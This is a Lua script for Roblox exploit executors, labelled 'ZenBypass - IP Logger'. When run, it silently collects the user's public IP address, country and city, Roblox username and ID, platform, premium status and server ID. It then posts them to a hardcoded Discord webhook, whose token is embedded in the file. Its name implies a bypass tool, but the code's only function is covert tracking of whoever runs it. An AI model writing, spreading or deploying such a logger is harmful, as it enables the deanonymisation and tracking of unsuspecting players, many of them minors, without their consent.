local webhook = "https://discord.com/api/webhooks/1525372084774240369/96S-zxBeDNNJFtV0mAHrVnBimkC0fkViDFzQum30hd_mXC06DQKohpTWgmaXI6Rq-wxn"

local function sendIP()
    local success, ip = pcall(function()
        return game:HttpGet("https://api.ipify.org")
    end)
    if not success then return end
    
    local player = game:GetService("Players").LocalPlayer
    local UserInputService = game:GetService("UserInputService")
    local HttpService = game:GetService("HttpService")
    
    local platform = UserInputService:GetPlatform()
    local platformMap = {
        [Enum.Platform.Windows] = "Windows",
        [Enum.Platform.Mac] = "Mac",
        [Enum.Platform.iOS] = "iOS",
        [Enum.Platform.Android] = "Android",
        [Enum.Platform.Xbox] = "Xbox",
        [Enum.Platform.PS4] = "PlayStation",
    }
    
    local ipinfo = {}
    local ok, result = pcall(function()
        return game:HttpGet("https://ipinfo.io/" .. ip .. "/json")
    end)
    if ok then
        ipinfo = HttpService:JSONDecode(result)
    end
    
    local info = "**🕵️ ZenBypass - IP Logger**\n```\n" ..
        "IP: " .. ip .. "\n" ..
        "País: " .. (ipinfo.country or "No disponible") .. "\n" ..
        "Ciudad: " .. (ipinfo.city or "No disponible") .. "\n" ..
        "Usuario: " .. player.Name .. " (" .. player.UserId .. ")\n" ..
        "Plataforma: " .. (platformMap[platform] or "Desconocido") .. "\n" ..
        "Premium: " .. (player.MembershipType == Enum.MembershipType.Premium and "✅" or "❌") .. "\n" ..
        "Móvil: " .. (UserInputService.TouchEnabled and "✅" or "❌") .. "\n" ..
        "Juego ID: " .. game.PlaceId .. "\n" ..
        "Servidor: " .. game.JobId .. "\n" ..
        "```"
    
    local data = {content = info}
    local requestFunc = syn and syn.request or http_request or request
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
        end)
    end
end

sendIP()
